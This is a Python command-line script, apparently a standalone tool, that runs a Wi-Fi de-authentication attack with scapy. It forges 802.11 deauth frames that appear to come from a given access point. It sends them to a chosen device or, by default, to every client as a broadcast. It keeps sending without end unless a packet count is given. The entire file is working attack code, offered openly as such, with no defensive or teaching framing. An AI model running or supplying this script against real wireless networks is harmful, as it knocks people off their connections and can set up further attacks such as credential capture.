#!/usr/bin/env python3
import sys

from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from utilities.vendor import VendorLookup
from argparse import ArgumentParser
from colorama import Fore, Style
import time


def args():
    parser = ArgumentParser(description="Wi-Fi De-authentication Attack Script By Saher Muhamed v1.0.0")
    parser.add_argument("-t", "--target", help="Target MAC address to de-authenticate (optional)")
    parser.add_argument("-g", "--gateway", dest="gateway_opt", required=True, help="Gateway MAC address (access point)")
    parser.add_argument("-i", "--interface", required=True, help="Network interface in monitor mode")
    parser.add_argument("-c", "--count", type=int, default=0,
                        help="Number of de-authentication packets to send (0 for infinite)")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay between packets in seconds")

    options = parser.parse_args()

    def is_valid_mac(mac):
        return len(mac.split(':')) == 6

    if not is_valid_mac(options.gateway_opt):
        parser.error("[-] Please specify a valid gateway MAC address, ex: -g AA:BB:CC:DD:EE:FF")

    if options.target and not is_valid_mac(options.target):
        parser.error("[-] Please specify a valid target MAC address, ex: -t AA:BB:CC:DD:EE:FF")

    return options


def deauth(target_mac, gateway_mac, interface, packet_count, delay=0.1):
    """
    Perform a de-authentication attack on a target MAC address via a specified gateway MAC address.

    :param target_mac: The MAC address of the target device (optional, defaults to broadcast).
    :param gateway_mac: The MAC address of the gateway (access point).
    :param interface: The network interface to use for the attack.
    :param packet_count: The number of de-authentication packets to send (0 for infinite).
    :param delay: The delay between sending packets (default is 0.1 seconds).
    """
    target_mac = target_mac or "FF:FF:FF:FF:FF:FF"  # if no target MAC is provided, use broadcast address
    vendor_lookup = VendorLookup(json_file_path="assets/mac-vendors-export.json")
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    deauth_packet = RadioTap() / dot11 / Dot11Deauth()
    packets_counter = 0

    while packet_count == 0 or packets_counter < packet_count:
        packets_counter += 1
        target_vendor = vendor_lookup.get_vendor(mac_address=target_mac)
        gateway_vendor = vendor_lookup.get_vendor(mac_address=gateway_mac)
        sendp(deauth_packet, iface=interface, count=1, verbose=0)
        print(
            Style.BRIGHT +
            f"\r[+] Sent {packets_counter} packets to "
            f"{target_mac} ({target_vendor}) via "
            f"{gateway_mac} ({gateway_vendor})...",
            end='', flush=True
        )
        time.sleep(delay)


if __name__ == "__main__":
    options = args()
    try:
        deauth(options.target, options.gateway_opt, options.interface, options.count, options.delay)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Detected 'ctrl + c', stopping de-authentication attack...\n" + Style.RESET_ALL)
        sys.exit(0)
